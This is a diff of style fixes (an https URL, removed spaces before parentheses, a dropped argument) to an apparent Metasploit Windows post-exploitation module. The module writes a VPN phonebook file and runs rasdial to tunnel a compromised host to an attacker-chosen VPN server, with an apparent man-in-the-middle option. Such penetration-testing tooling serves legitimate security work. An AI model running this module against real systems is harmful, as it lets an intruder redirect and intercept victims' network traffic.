@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
@@ -36,7 +35,7 @@ class MetasploitModule < Msf::Post
         OptInt.new('TIMEOUT', [true, 'Timeout for the tunnel creation.', 60]),
         OptString.new('PBK_NAME', [true, 'PhoneBook entry name.', 'MSF']),
         OptAddress.new('VPNHOST', [true, 'VPN server.'])
-      ], self.class)
+      ])
   end
 
 
@@ -87,14 +86,14 @@ class MetasploitModule < Msf::Post
     conf_conn += "IpPrioritizeRemote=0\r\n" unless mim
 
     if write_file(pbk_file,conf_conn)
-      print_good ("PhoneBook configuration written to #{pbk_file}")
+      print_good("PhoneBook configuration written to #{pbk_file}")
       return pbk_file
     end
   end
 
 
   def run_rasdial(pbk,user,pass,vpn_host,pbk_name)
-    print_status ("Establishing connection ...")
+    print_status("Establishing connection ...")
     cmd_exec("rasdial","/disconnect")
     output_run = cmd_exec("rasdial","#{pbk_name} #{user} #{pass} /PHONE:#{vpn_host} /PHONEBOOK:#{pbk}")
     output_view = cmd_exec("rasdial", nil)
